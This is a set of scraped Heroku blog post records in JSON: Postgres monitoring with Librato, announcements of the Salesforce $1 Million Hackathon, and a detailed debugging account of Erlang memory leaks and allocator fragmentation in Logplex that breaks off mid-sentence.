{"website": "Heroku", "title": "Monitoring your Heroku Postgres Database", "author": ["Craig Kerstiens"], "link": "https://blog.heroku.com/monitoring_your_heroku_postgres_database", "abstract": "Monitoring your Heroku Postgres Database Posted by Craig Kerstiens October 16, 2013 Listen to this article There are two axes of database monitoring. One axis is immediate insight. You can see what is happening right now, getting just-in-time visibility to solve problems and observe production behavior as it happens. The other axis is historical monitoring. This provides long-term persistence and reporting on the most important metrics over time, helping you make better decisions and understand trends. With Heroku Postgres, you can get immediate insight with the pg-extras CLI plugin. Furthermore, we provide key metrics about your database right in your logs already for all applications. For storage and reporting of your most important metrics, you can quickly set up rich historical reporting with Librato, which is available in our Add-ons marketplace. In this post, we walk through how to get started with Heroku Postgres monitoring for immediate visibility and long-term insight. A healthy value for your cache hit will be as close to 100% as possible It Starts with Logs Heroku automatically collates and routes logs from every part of your app into a single channel, providing truly comprehensive, extensible, app-centric logging. With production Postgres databases on Heroku, robust logs and key metrics from your persistence level are routed directly into this stream. Key data including table-cache-hit , db_size , active-connections and more, outputting directly into your Heroku logs periodically. You can get immediate visibility into this stream by combining tail with a filter argument: $ heroku logs --tail --ps heroku-postgres Even better than viewing these logs manually is you can configure a log drain to be able to send your logs elsewhere. Fortunately when taking advantage of some of our add-ons they can automatically consume these logs without having to configure anything else. Getting started with Librato Librato is one such add-on that consumes your Heroku logs and gives you the ability to monitor on historical trends and set up alerts. You can get started with it right away by provisioning the add-on: $ heroku addons:add librato Librato will now be automatically consuming data from your Heroku logs and you can simply open it up to get immediate visibility into your Heroku Postgres cache hit, database connections, and insight around request queueing. If you have log runtime metrics already enabled on your application then you’ll see those insights as well. Going further While the initial dashboard is already helpful, you can gain additional insights by adding your own instruments to your dashboard. And if you need data thats not already available in your Heroku log stream you can add custom data yourself . postgres", "date": "2013-10-16,"},
{"website": "Heroku", "title": "Compete to win the Salesforce $1 Million Hackathon", "author": ["Sara Dornsife"], "link": "https://blog.heroku.com/salesforce-1million-hackathon", "abstract": "Compete to win the Salesforce $1 Million Hackathon Posted by Sara Dornsife October 25, 2013 Listen to this article How would you like to win $1 million in a hackathon? Seriously. As you know, Heroku is part of the Salesforce Platform. A platform with a growing developer community and broad range of technologies that developers have used to create amazing solutions. So at Salesforce, we thought we’d cook up a little surprise. OK, a huge surprise: the world’s first hackathon with a single $1 million prize. It’s on. Come to Dreamforce . Build a next­ generation mobile app. And win a million bucks. Really. What better way to say thank you to our developers than to put on the biggest on­site hackathon in history. Today, we are thrilled to launch the Salesforce $1 Million Hackathon ! Here's how to get started: Read the rules, eligibility and details . Pack up your team and register for Dreamforce . Either a full Dreamforce pass or the $99 Dreamforce Developer Hack Pass to get you into just the Opening Keynote, DevZone and Cloud Expo for DreamHack. Start coding. Your choice of technologies is huge - Heroku , Force.com , ExactTarget , Salesforce Platform Mobile Services , and more. Be creative, innovative, unique - the winning team is walking away on Thursday, Nov 21st with $1,000,000! Also, be sure to check out the the DevZone while you're there -  for workshops, labs, mobile theaters, vendors and partners, and more than 200 developer sessions.", "date": "2013-10-25,"},
{"website": "Heroku", "title": "$1 Million Hack - $99 pass FREE for a limited time", "author": ["Sara Dornsife"], "link": "https://blog.heroku.com/1million-hack-free", "abstract": "$1 Million Hack - $99 pass FREE for a limited time Posted by Sara Dornsife November 06, 2013 Listen to this article As we previously announced , salesforce.com is hosting a $1 Million Hackathon for the most awesome mobile app built using Salesforce Platform, which includes Heroku.  It's taking place now and culminates at Dreamforce in San Francisco. For a limited time we are making it FREE ($99 value) to participate in the Salesforce $1 Million Hackathon. Sign up for the Hacker Pass and you will get access to the Hackathon plus all the great content and activities in the Developer Zone at Dreamforce. Additionally, the first 500 people to use the promo code HEROKU when registering will receive a $200 Heroku credit on-site at the Hackathon. Get your FREE Hacker Pass and $200 credit when you register with code HEROKU for the Salesforce $1 Million Hackathon today!", "date": "2013-11-06,"},
{"website": "Heroku", "title": "Troubleshooting Down the Logplex Rabbit Hole", "author": ["Fred Hebert"], "link": "https://blog.heroku.com/logplex-down-the-rabbit-hole", "abstract": "Troubleshooting Down the Logplex Rabbit Hole Posted by Fred Hebert November 07, 2013 Listen to this article Adventures of a Heroku Routing Engineer My name is Fred and I spend most of my time on Logplex . Since joining Heroku in March 2013, I've become the main developer on that product and handle most of the maintenance and support that goes with it. In this post, I'll explain what the Heroku routing team needed to do to make Logplex more stable, decrease our workload, and keep our mornings quiet and productive. I'm a remote employee on the Heroku routing team, and I live on the East coast, which means I'm usually the first one in the routing room in the company's HipChat. Later, Tristan, who lives in Illinois, joins me. Then a few hours later, the rest of the team joins us from the West coast, where most of Heroku's employees are located. I usually have a few silent hours to work without interruptions, e-mails, questions, scheduled meetings, and other distractions, which is a relaxing and productive way to start the day. Customer support tickets that get escalated to the team, or Nagios and PagerDuty alarms, which I try to intercept before they wake my on-call teammate, are the only interruptions to my otherwise productive mornings. Generally, the alarms are rare, and my mornings are becoming increasingly uneventful. Back in June and May, however, an array of alarm interruptions was exhausting our entire routing team. Alarms were coming from all stacks, while customer support tickets also started rolling in. The problems compounded to make a bad situation worse. Alarms interrupt the team's work flow, which then slows down our ability to resolve the problems. Issues cropped up at all hours of the day and night, so the team, especially the engineer on call, was worn down and becoming less productive, and our time was consumed by interruptions and fires to extinguish. Although we have other areas of focus, the routing team mainly works on Heroku's HTTP routing stack and the logging infrastructure, centered around Logplex. A sizeable number of alarms were related to individual Logplex nodes that kept crashing with increasing frequency, each time generating alerts in our chat system, via e-mail, and ultimately through the routing team's worst enemy, PagerDuty. What Logplex Does Before going further, I should explain what Logplex does, otherwise this entire post may be a bit confusing. The simplest way to explain Logplex is that it takes log data coming from everywhere in Heroku (dynos, routers, and runtimes) and pushes the data around to other endpoints. More specifically, Logplex accepts syslog messages from either TCP or HTTP(s) streams on any node in the cluster. Each of these nodes will store the log messages in Redis buffers (1,500 lines) to be accessed by heroku logs , allow a distributed merging of all the incoming streams for a given application in order to be displayed live with heroku logs --tail , or will forward them over through drains. Drains are buffers on each of the Logplex nodes. They accumulate messages received for each node, and then forward them to remote endpoints designated for an application by a user or an add-on provider. This can be done over TCP syslog, or a custom HTTP(s) syslog format when required. The workflow, to make it simple, looks a bit like this: There's also an HTTP API that lets tools and users manipulate the drains, tails, and sessions to be used in the system. When dealing with logs, we get unpredictable loads, which may be bursty (for example, when an application crashes and generates 50,000 lines of stack traces). Thus, overload is a constant issue with Logplex. Generally speaking, overload can be dealt with in three ways: Scale up forever by adding machines. Block the input to slow down the producers. Shed load by dropping requests. The first option is good when you are in over your head, because no matter what you do, the current system can never handle the load and the quality of service is bad. The second option, on the other hand, is one we want to avoid  within Logplex. We don't want an overloaded Logplex node to slow down Heroku applications that are trying to log data, or applications that are busy crashing. This leaves us with the third option, shedding load. How to handle overload is an important decision to make when you are first designing a system, because it will impact the data flow throughout the process. A system that chooses to block must be synchronous in most of its operations so that the bottleneck located deep within the app can impact the accept rate of the API at the edge of the system. An app that chooses to shed load must be mostly asynchronous internally and its slowest components, where data tends to accumulate, must be able to drop the overload. For Logplex, which is written in Erlang, we do this load shedding in each process that writes to the outside world: the tail buffers, and we have the Redis buffers locally and within each single drain. To work this way, the drain can be thought of as a combination of two state machines: a state machine representing the connection or protocol negotiation state for the socket to the remote endpoint; a state machine handling the buffering of log lines (both on input and output). For the first type, the most basic machine is: This means that a drain can be disconnected or connected to a given endpoint and transition between the two. The second type, for buffering, can be represented as: Both machines are conceptually simple, and HTTP drains, for example, use one process for each of them. There is some message passing overhead, but the model is easy to reason about. To conserve resources, TCP drains will execute both state machines within a single Erlang process. The \"accumulating\" and \"extracting\" buffer operations can be made implicit to every operation, but because the input stream to a process is never stopping and impossible to regulate directly, they should never be blocked by other operations without compromising the stability of the system. This means that operations such as sending a message must be made asynchronous, prompting for an additional state: In practice, both drain implementations are far more complex as a result of a plethora of small business rules and behaviors we want to enforce, such as batching, retrying failed messages, loss reporting, send time outs, exponential backoffs, and so on. The key points are that HTTP buffers are conceptually simpler (and thus safer), but cost more in terms of resources; and TCP buffers are more efficient, but trickier to reason about and consequently easier to mess up by accident. So that's the sky-high view of what I work on when I dive into in Logplex. Garfield Would Hate All Days if They Had PagerDuty Alarms As I mentioned, alarms were rolling in, which was particularly frustrating to our team because the system had been designed so that its architecture could cope with individual node failures. The problem was that we received alerts that were useless because they were not actionable. When a Logplex node would go down, I'd get a page, acknowledge it, wait for it to clear up, then go to sleep until the next day, when I would start investigating. We ended up turning off the alarms for node failures, but we still wanted to reduce the failure rates. Users' logs that were in transit over the node are lost when it crashes, and although losing logs (as opposed to losing customer information) isn't that big of a deal because you can always generate more, it still makes for a bad user experience. To make a forced analogy, the system was on painkillers, but we still had to fix what was causing the pain. Thus, I needed to figure out why the nodes kept dying (almost randomly), and then fix the problem so it stopped happening so frequently. Fixing Crashes Through Refactoring First Attempt at Fixing the Problem Investigating the Cause of the Error I was able to wait for a day before investigating a crash because Erlang nodes that go down generate a crash dump , which is a file containing basic information (for example, a slogan that says why the node died, such as its inability to allocate memory) for the entire node. The dump also provides the state of all processes that were running at the time, minus a few details. Each dump can range from a few hundred MBs up to a few GBs in size, and rummaging through them for relevant details can be challenging. At first the dumps are intimidating, and they remain so for a while. But as you get used to your nodes dying, you get a better understanding of crash dumps. Common patterns pop up, and often these are message queues of processes that are excessively large, the number of processes or open ports and sockets, the size of some processes in memory, and so on. Most failures are going to be caused by one of these conditions. Finding patterns in the crash dump will lead you to a specific part of the code, which will help you reproduce the bug later. After finding the patterns, I wrote a script that quickly scans large crash dumps to find and report them as plain text. Using this script and manual digging in the Logplex crash dumps, I could see the most frequent pattern, which was a single process with a large mailbox causing the node to go out of memory. By looking at the faulty process's call stack and ancestors in the dump, I could see that the problem was almost always a TCP Syslog drain. I had never seen an HTTP(s) drain at fault for these failures, but the failures could be because we have nearly an order of magnitude more TCP Syslog drains than HTTP(s) drains, or it could be due to our TCP Syslog drains implementation blocking. Without knowing what to attack and experiment with, I couldn't do much debugging. The Splunk and Graphite data we have showed that the node's memory would progressively go up sometime between 10 and 40 minutes. This, combined with a large mailbox, told me that the problem was related to slow input, rather than fast input the drain couldn't keep up with. Given that data set, I decided to blame the TCP Syslog drain implementation for our problems. Trying to Refactor Drains Even though hunting down individual blocking elements in the TCP Syslog drains is possible, the routing team and I decided to try refactoring it to use two distinct finite state machines, like the HTTP(s) drains did. This would make the code infinitely simpler, and promised lower latency and memory at the price of higher drop rates; if messages stay shorter in the process's mailbox so they can be dropped, there are fewer held back and gobbling memory at any point in time. After taking a few days implementing the changes, and running tests and benchmarks, I returned to the team with a solution that seemed to achieve the goals we'd outlined. We agreed to send the code to staging, where it matured and proved to be absolutely stable for a while. The problem with staging, however, is that it does not need to sustain the same load production does, and generating the kind of daily traffic Logplex must deal with locally or in staging would be a serious undertaking. So far, generating that kind of traffic has not been worth it for the routing team in terms of developer resources. I crossed my fingers and added one production node to run the modified code over a few days so I could monitor it and assess that the code could sustain production loads correctly. Hiccuping so Hard You Die When we looked at our team's internal tools that displayed live statistics for all Logplex nodes, the new one performed terribly. The node still had acceptable throughput, but we found a stop-start cycle of roughly 15 seconds, for a few milliseconds of pause at a time. This stop-start cycle meant that the node was having a hard time scheduling all of its Erlang processes in time for them to do their necessary work. Under heavy load, this may be understandable, and eventually the node may recover, but the load was quite regular at this point, and my new node was doing considerably worse than all of its older siblings. After a few hours, some of the freezes would last longer and longer, and eventually, the node would come crashing down. Second Attempt at Fixing the Problem Searching for the Cure (for Hiccups) I wanted to fix things, so I dove into the application logs. There was a considerably long event sequence to comb through. A typical Logplex node will log anywhere between 100 and 350 messages a second internally. A crashing one can bring this up to multiple thousands, and the events that were most useful to diagnose the failure could have happened 15 to 30 minutes earlier. After studying the logs for a while, I was able to attribute the initial failing calls to cowboy 's acceptors, which is a library we use for our HTTP input stream. In short, the cowboy server had an architecture a bit like this: This architecture is  a regular pattern for TCP servers in Erlang. The manager (or a supervisor) opens up a listen socket, and shares it with a group of acceptors. Then each acceptor can concurrently accept new connections and handle them, or pass them off to a third party. This usually allows for far better connection times with shorter delays than doing things sequentially with one single process. The special thing about this cowboy implementation, however, was that every time an acceptor accepted a connection, it reported back to the manager, a central process, to track the connection and check for configuration changes. This manager was a bottleneck for the execution of the program. Loïc , Cowboy's maintainer, knew about this bottleneck, which also showed up in benchmarks. To fix the problem, albeit temporarily, he did a trick that few Erlang applications should ever do: he raised the process priority. To understand the implications of the fix, you should be aware that Erlang's VM does preemptive scheduling of all processes, and does so fairly across all processes based on a) the work they have accomplished, b) how busy the node is, and c) the work they will have to accomplish (e.g., if their mailbox is full). Because of this balancing, some important system processes often need a larger share of the processing power. The Erlang VM therefore supports four process priorities: low normal (default) high max Every process that has a \"high\" priority and has to run code right now will do so before any of the \"normal\" processes can run. All the \"normal\" processes will run before the \"low\" processes can. This can work reasonably well when you know the load characteristics of the system you will have, and that higher priority tasks are truly higher priority; however, in the case of cowboy, the priorities were merely a work-around for speed in artificial benchmarks. The supposition for all our woes became rather evident to me: My refactoring nearly doubled the number of processes on the node, creating more contention for schedulers. Cowboy was hogging the scheduler time to accept connections and communicate with acceptors. Other processes (those handling the requests) were starved for CPU time. Before I blame cowboy for all the issues, keep in mind that Logplex was running an old version of the server (0.6.1), and that newer versions (0.8+) have gone through architectural changes that entirely removed that central bottleneck for most calls and dropped the priority back to normal. I first tested the hypothesis by manually changing the scheduler priority of the cowboy process, without otherwise altering the server's design. The crashes became a bit less frequent, but the new nodes were still not reliable enough to lead to solid conclusions from tests. Despite our team's best efforts, I had little data and no way to reproduce the hiccups anywhere other than in production. I still held onto the idea that cowboy's architecture might be a problem; it still had a central bottleneck, despite the scheduler priorities being right. Now it was time to upgrade to a newer Cowboy version. Upgrading the Servers and Nodes We settled on Cowboy 0.8.5, which had a new internal architecture. Unfortunately, this required upgrading the Erlang version from R15 to R16. Erlang versions tend to be backwards compatible, and deprecations come only with a few warnings, which I wanted to eliminate. The biggest issues were the interface changes in the cowboy library itself, which required extensive testing to ensure full backwards compatibility for seamless deployments. R16 also contained what promised to be sweet scheduler optimizations that we hoped to get our hands on, and I optimized the work done with ETS tables to be more parallel and require less data copying, and also shipped a few important bug fixes to make sure it was worth upgrading. This ended up being a bit complex because some of the bugs were urgent and deployed on the production nodes running R15, then were ported forward to work on R16, which I then forked to make work with the new cowboy version, which had to be merged back with the other branch that ... and so on. At one point I was running and monitoring four different versions of Logplex at the same time in production to see which one would win. This wasn't the smartest option, but, given how difficult isolating variables is, it was the most practical option at the time. One apparent result was that the regular R16 nodes were doing well, without the stop-start cycles. Eventually, I replaced all R15 production nodes with R16 ones, and kept four nodes running R16 with the split TCP Syslog drains. Don't Stop Me Now After monitoring the system for a few weeks, I only saw minor improvements from the split drains nodes. They seemed to lock less frequently, and far less violently. Then, every four or five days, one of the new nodes would go radio silent. They would appear to be running, but nothing would come in and out of the VM for 20-30 minutes at a time, then a thousand lines of logs, then nothing again. Connecting to the node through a remote shell or killing it in a way that generated a crash dump was impossible. Nodes never would recover fully from this, always flapping between \"poorly usable\" and \"not usable at all.\" I decided to give up on weeks' worth of work because there was no way to run the code at the time. Maybe, now that the routing team changed some internal mechanisms for the system and the VM still made more progress with its schedulers, running the code would be possible, but back then I was at a dead end. I didn't admit total defeat, however, because time proved that all the other nodes in the fleet (those updated to R16, but without changing the drain model) had stopped crashing almost entirely. I ported the rest of the optimizations that weren't there yet to that branch, and we made that the standard for the entire cluster. The boosts in reliability were such that I could archive the trello cards related to the tasks and could start working on other stuff. Roughly three weeks later, Nagios started screaming in the routing team's internal chat room every five minutes, for days at a time. Some nodes in the cluster had their memory bubble up, and never gave it back to the OS. The nodes wouldn't crash as fast as before; instead, they'd grow close to the ulimit we'd set and hover there, taunting Nagios, and us by extension. Clearly, I needed to do more work. I Just Keep on Bleeding and I Won't Die First Attempt at Fixing THAT Problem Garbage Garbage Collection At first I decided to wait it out and see when the node would crash, as it had to do at some point. I hoped that a crash dump would hold details about memory that could help. Maybe the Logplex nodes were resentful that I wanted to work on something else, but they wouldn't ever go over the memory limit. They'd wait and nag and die (or refuse to) for my attention. Eventually I logged onto the misbehaving production node and ran the following expression within the Erlang shell: [erlang:garbage_collect(Pid) || Pid <- processes()]. This effectively goes through all processes on the Erlang node, and forces a garbage collection on them. The alarms stopped. Manually forcing the garbage collection turned out to work wonders. The question was: Why? Before answering that, though, I needed data. The node hadn't crashed, the garbage was gone, and before a node could display that annoying behavior took weeks. I had little choice but to wait. Fortunately, the phenomenon happened more frequently over time. A few nodes eventually managed to go overboard and die for me. The analysis of the crash dumps revealed that there was no single process holding a criminal amount of memory, and neither was a single mailbox (largest: 26) looking like it would explode. Some processes had high levels of memory, but live profiling didn't give any single process as a culprit. As the plot thickened, I kept manually calling for garbage collection when a Nagios memory alert cropped up, but something looked off. Here's a table of one of the nodes' memory consumption as reported by Erlang and by the OS before and after forced global garbage collection: logplex.82559 erlang:memory(total) beam process node total Pre GC 9.87 GB 12.9 GB 14.15 GB Post GC 5.89 GB 11.8 GB 12.9 GB Delta -3.98 GB -1.1 GB -1.25 GB And here's what a relatively fresh node looks like: logplex.83017 erlang:memory(total) beam process node total Memory 6.4 GB 6.7 GB 7.6 GB That was fairly weird and highlighted two big things: Garbage collection seems to have trouble doing its job for the entire node without being prompted. There is memory not allocated directly by Erlang (the language) that seems to stay around and grow with time. I decided to focus on the first point (why GC was having trouble) because it was immediately actionable and showed tangible results that could prevent errors and crashes. I had no  idea what the culprit was, but at some point, one of the nodes started triggering errors. I sat at the terminal, waiting to see changes in metrics. While the OS would report the following: the VM would internally report the following (the scales are different and confusing): Here are the numbers for the memory statistics over time: logplex@ip.internal)1> [{K,V / math:pow(1024,3)} || {K,V} <- erlang:memory()].\n[{total,10.441928684711456},\n {processes,3.8577807657420635},\n {processes_used,3.8577076755464077},\n {system,6.584147918969393},\n {atom,3.5428348928689957e-4},\n {atom_used,3.483891487121582e-4},\n {binary,2.7855424359440804},\n {code,0.008501693606376648},\n {ets,3.745322160422802}]\n\n%% waiting 20 minutes %%\n\nlogplex@ip.internal)1> [{K,V / math:pow(1024,3)} || {K,V} <- erlang:memory()].\n[{total,11.024032421410084},\n {processes,3.953512007370591},\n {processes_used,3.9534691693261266},\n {system,7.070520414039493},\n {atom,3.5428348928689957e-4},\n {atom_used,3.483891487121582e-4},\n {binary,3.2071433141827583},\n {code,0.008501693606376648},\n {ets,3.8099956661462784}] This shows heavy memory growth, most of it for binary memory, going from 2.79GB up to 3.21GB. Remembering Mahesh Paolini-Subramanya's blog post on binary memory leaks, I decided to try confirming that this was indeed the root cause. Erlang's binaries are of two main types: ProcBins and Refc binaries . Binaries up to 64 bytes are allocated directly on the process's heap, and take the place they use in there. Binaries bigger than that get allocated in a global heap for binaries only, and each process holds a local reference in its local heap. These binaries are reference-counted, and the deallocation will occur only once all references are garbage-collected for all processes that held a binary. In 99% of the cases, this mechanism works entirely fine. In some cases, however, the process will either: do too little work to warrant allocations and garbage collection; eventually grow a large stack or heap with various data structures, collect them, then get to work with a lot of refc binaries. Filling the heap again with binaries (even though a virtual heap is used to account for the refc binaries' real size) may take a lot of time, giving long delays between garbage collections. In the case of Logplex, the latter case was the one occuring. I confirmed it by polling processes of a node with process_info(Pid, binary) , which returns a list of all the binary references of a process in a list. The length of the list can be used to know which processes hold the most references, but that's not quite enough yet; these references may be valid. Building that list, calling for global garbage collection on the node, then building a new list and calculating the delta between both to know which processes held the most out-of-date references needed to be done next: (logplex@ip.internal)3> MostLeaky = fun(N) ->\n(logplex@ip.internal)3>     lists:sublist(\n(logplex@ip.internal)3>      lists:usort(\n(logplex@ip.internal)3>          fun({K1,V1},{K2,V2}) -> {V1,K1} =< {V2,K2} end,\n(logplex@ip.internal)3>          [try\n(logplex@ip.internal)3>               {_,Pre} = erlang:process_info(Pid, binary),\n(logplex@ip.internal)3>               erlang:garbage_collect(Pid),\n(logplex@ip.internal)3>               {_,Post} = erlang:process_info(Pid, binary),\n(logplex@ip.internal)3>               {Pid, length(Post)-length(Pre)}\n(logplex@ip.internal)3>           catch\n(logplex@ip.internal)3>               _:_ -> {Pid, 0}\n(logplex@ip.internal)3>           end || Pid <- processes()]),\n(logplex@ip.internal)3>      N)\n(logplex@ip.internal)3> end,\n(logplex@ip.internal)3> MostLeaky(10).\n[{<0.9356.0>,-158680},\n {<0.4782.0>,-113260},\n {<0.21671.0>,-31253},\n {<0.17166.0>,-23081},\n {<0.16754.0>,-20260},\n {<0.5595.0>,-19292},\n {<0.7607.0>,-18639},\n {<0.716.0>,-18184},\n {<0.19981.0>,-17747},\n {<0.21843.0>,-15908}] I have since added that function to the recon library so that nobody is required to do these calls by hand. The little data dump above showed that some processes held more than 100,000 stale references to refc binaries, and a lot of them held more than 10,000. This told me that some processes held a lot of binaries, and investigating individual processes revealed they were all drains or buffers of some kind. This was bad news because it meant that the way Logplex is built is more or less playing right into one of the few rare cases where the Erlang GC isn't delivering results on par with what is promised for the general case. The Logplex application, which looked like a perfect match for Erlang, got trapped into an implementation detail that made it a pathological case for the VM. Picking Up the Trash Generally, refc binaries memory leaks can be solved in a few different ways: call garbage collection manually at given intervals (icky); manually track binary sizes and force GC , which defeats the purpose of having garbage collection in the first place and may do a worse job than the VM's virtual binary heap; stop using binaries (not desirable); or add hibernation calls when appropriate (possibly the cleanest solution). I decided to put a quick fix in place, which still lives in production to this day. The simple module basically loops on itself and at given intervals polls for the reported memory, checks to see whether it goes past a threshold, and if so, garbage collects the node. If required, the module also allows manual calls. The script worked as expected, and high memory warnings were quickly tamed, logged (with the deltas), and waiting to be inspected later. The Attempt Fails, Somewhat After a few weeks looking at the logs and seeing that no incident with the nodes could be related to memory issues, logs showed garbage collections happening as required, and everything looked great. Resorting to emergency measures as the only way to get the node to drop high amounts of memory isn't ideal, however, and we never know how fast a spike in usage will happen. I decided to add a bunch of hibernation calls in non-intrusive locations (inactive drains, or when disconnecting from a remote endpoint), which would allow us to garbage collect globally much less frequently, while keeping memory lower overall when people register mostly inactive drains. Everything went fine, except that after five weeks, one node crashed despite the fixes being in place. The global garbage collection didn't even get triggered. Looking at logs from the OS and from the Logplex node internally revealed that the OS allocated 15GB of RAM to the Logplex node, while it internally reported using less than half of that. We had a serious memory leak, which was incredibly frustrating. Second Attempt at Fixing THAT Problem How Erlang's Memory Stuff Works At this point, I was hitting the limits of what I knew about the Erlang virtual machine, and I suspected that either memory leaks were going on outside of the memory the VM reported, or the nodes were victim to memory fragmentation. (We're using NIFs for lzf decompression, but the VM could have been at fault, too.) Not knowing what to do, I contacted Lukas Larsson . A few years back, when I spent my first two weeks at Erlang Solutions Ltd. in London, Lukas was also there for a few days and acted as my guide through the city and company. Since then, Lukas has moved on (internally) to consult for the OTP team at Ericsson, and I moved on to AdGear, and then to Heroku. We still connect occasionally at conferences and over IRC, and Lukas has always helped answer my tricky questions about the Erlang VM. I asked Lukas how I could pinpoint what was wrong—memory leak or fragmentation—and I showed him some of my collected data. I'm sharing what I learned in the process because, in addition to be interesting, the information is not documented anywhere other than the source. The amount returned by erlang:memory/0-1 is the amount of memory actively allocated, where Erlang terms are laid in memory; this amount does not represent the amount of memory that the OS has given to the virtual machine (and Linux doesn't actually reserve memory pages until they are used by the VM). To understand where memory goes, one must first understand the many allocators being used: temp_alloc: does temporary allocations for short use cases (such as data living within a single C function call). eheap_alloc: heap data, used for things such as the Erlang processes' heaps. binary_alloc: the allocator used for reference counted binaries (what their 'global heap' is). ets_alloc: ETS tables store their data in an isolated part of memory that isn't garbage collected, but allocated and deallocated as long as terms are being stored in tables. driver_alloc: used to store driver data in particular, which doesn't keep drivers that generate Erlang terms from using other allocators. The driver data allocated here contains locks/mutexes, options, Erlang ports, etc. sl_alloc: short-lived memory blocks will be stored there, and include items such as some of the VM's scheduling information or small buffers used for some data types' handling. ll_alloc: long-lived allocations will be in there. Examples include Erlang code itself and the atom table, which stay there. fix_alloc: allocator used for frequently used fixed-size blocks of memory. One example of data used there is the internal processes' C struct, used internally by the VM. std_alloc: catch-all allocator for whatever didn't fit the previous categories. The process registry for named process is there. The entire list of where given data types live can be found in the source . By default, there will be one instance of each allocator per scheduler (and you should have one scheduler per core), plus one instance to be used by linked-in drivers using async threads . This ends up giving you a structure a bit like the drawing above, but split it in N parts at each leaf. Each of these sub-allocators will request memory from mseg_alloc and sys_alloc depending on the use case, and in two possible ways. The first way is to act as a multiblock carrier (mbcs), which will fetch chunks of memory that will be used for many Erlang terms at once. For each mbc, the VM will set aside a given amount of memory (~8MB by default in our case, which can be configured by tweaking VM options), and each term allocated will be free to go look into the many multiblock carriers to find some decent space in which to reside. Whenever the item to be allocated is greater than the single block carrier threshold (sbct) , the allocator switches this allocation into a single block carrier (sbcs). A single block carrier will request memory directly from mseg_alloc for the first 'mmsbc' entries, and then switch over to sys_alloc and store the term there until it's deallocated. So looking at something such as the binary allocator, we may end up with something similar to: Whenever a multiblock carrier (or the first 'mmsbc' single block carriers) can be reclaimed, mseg_alloc will try to keep it in memory for a while so that the next allocation spike that hits your VM can use pre-allocated memory rather than needing to ask the system for more each time. When we call erlang:memory(total) , what we get isn't the sum of all the memory set aside for all these carriers and whatever mseg_alloc has set aside for future calls, but what actually is being used for Erlang terms (the filled blocks in the drawings above). This information, at least, explained that variations between what the OS reports and what the VM internally reports are to be expected. Now we needed to know why our nodes had such a variation, and whether it really was from a leak. Fortunately, the Erlang VM allows us to get all of the allocator information by calling: [{{A, N}, Data} || A <- [temp_alloc, eheap_alloc, binary_alloc, ets_alloc,\n                          driver_alloc, sl_alloc, ll_alloc, fix_alloc, std_alloc],\n                   {instance, N, Data} <- erlang:system_info({allocator,Allocator})] The call isn't pretty and the data is worse. In that entire data dump, you will retrieve the data for all allocators, for all kinds of blocks, sizes, and metrics of what to use. I will not dive into the details of each part; instead, refer to the functions I have put inside the recon library that will perform the diagnostics outlined in the next sections of this article. To figure out whether the Logplex nodes were leaking memory, I had to check that all allocated blocks of memory summed up to something roughly equal to the memory reported by the OS. The function that performs this duty in recon is recon_alloc:memory(allocated) . The function will also report what is being actively used ( recon_alloc:memory(used) ) and the ratio between them ( recon_alloc:memory(usage) ). Fortunately for Logplex (and me), the memory allocated matched the memory reported by the OS. This meant that all the memory the program made use of came from Erlang's own term allocators, and that the leak came from C code directly was unlikely. The next suspected culprit was memory fragmentation. To check out this idea, you can compare the amount of memory consumed by actively allocated blocks in every allocator to the amount of memory attributed to carriers, which can be done by calling recon_alloc:fragmentation(current) for the current values, and recon_alloc:fragmentation(max) for the peak usage. By looking at the data dumps for these functions (or a similar one), Lukas figured out that binary allocators were our biggest problem. The carrier sizes were large, and their utilization was impressively low: from 3% in the worst case to 24% in the best case. In normal situations, you would expect utilization to be well above 50%. On the other hand, when he looked at the peak usage for these allocators, binary allocators were all above 90% usage. Lukas drew a conclusion that turned out to match our memory graphs. Whenever the Logplex nodes have a huge spike in binary memory (which correlates with spikes in input, given that we deal with binary data for most of our operations), a bunch of carriers get allocated, giving something like this: Then, when memory gets deallocated, some remnants are kept in Logplex buffers here and there, leading to a much lower rate of utilization, looking similar to this: The result is a bunch of nearly empty blocks that cannot be freed. The Erlang VM will never do defragmentation, and that memory keeps being hogged by binary data that may take a long time to go away; the data may be buffered for hours or even days, depending on the drain. The next time there is a usage spike, the nodes might need to allocate more into ETS tables or into the eheap_alloc allocator, and most of that memory is no longer free because of all the nearly empty binary blocks. Fixing this problem is the hard part. You need to know the kind of load your system is under and the kind of memory allocation patterns you have. For example, I knew that 99% of our binaries will be smaller or equal to 10kb, because that's a hard cap we put on line length for log messages. You then need to know the different memory allocation strategies of the Erlang virtual machine: Best fit (bf) Address order best fit (aobf) Address order first fit (aoff) Address order first fit carrier best fit (aoffcbf) Address order first fit carrier address order best fit (aoffcaobf) Good fit (gf) A fit (af) For best fit (bf), the VM builds a balanced binary tree of all the free blocks' sizes, and will try to find the smallest one that will accommodate the piece of data and allocate it there. In the drawing above, having a piece of data that requires three blocks would likely end in area 3. Address order best fit (aobf) will work similarly, but the tree instead is based on the addresses of the blocks. So the VM will look for the smallest block available that can accommodate the data, but if many of the same size exist, it will favor picking one that has a lower address. If I have a piece of data that requires three blocks, I'll still likely end up in area 3, but if I need two blocks, this strategy will favor the first mbcs in the diagram above with area 1 (instead of area 5). This could make the VM have a tendency to favor the same carriers for many allocations. Address order first fit (aoff) will favor the address order for its search, and as soon as a block fits, aoff uses it. Where aobf and bf would both have picked area 3 to allocate four blocks, this one will get area 2 as a first priority given its address is lowest. In the diagram below, if we were to allocate four blocks, we'd favor block 1 to block 3 because its address is lower, whereas bf would have picked either 3 or 4, and aobf would have picked 3. Address order first fit carrier best fit (aoffcbf) is a strategy that will first favor a carrier that can accommodate the size and then look for the best fit within that one. So if we were to allocate two blocks in the diagram above, bf and aobf would both favor block 5, aoff would pick block 1. aoffcbf would pick area 2, because the first mbcs can accommodate it fine, and area 2 fits it better than area 1. Address order first fit carrier address order best fit (aoffcaobf) will be similar to aoffcbf, but if multiple areas within a carrier have the same size, it will favor the one with the smallest address between the two rather than leaving it unspecified. Good fit (gf) is a different kind of allocator; it will try to work like best fit (bf), but will only search for a limited amount of time. If it doesn't find a perfect fit there and then, it will pick the best one encountered so far. The value is configurable through the mbsd VM argument. A fit (af), finally, is an allocator behavior for temporary data that looks for a single existing memory block, and if the data can fit, af uses it. If the data can't fit, af allocates a new one. Each of these strategies can be applied individually to every kind of allocator, so that the heap allocator and the binary allocator do not necessarily share the same strategy. The Memory Is Coming from Inside the House Lukas recommended we go with the address order best fit strategy (aobf), along with a reduction in the size of our average mbcs for the binary allocator. With this strategy, we used more CPU to pick where data would go, but the VM hopefully would favor existing free blocks in more cases, meaning that we would have much fewer near-empty mbcs sitting around after a usage spike. I enabled these settings for a few nodes in 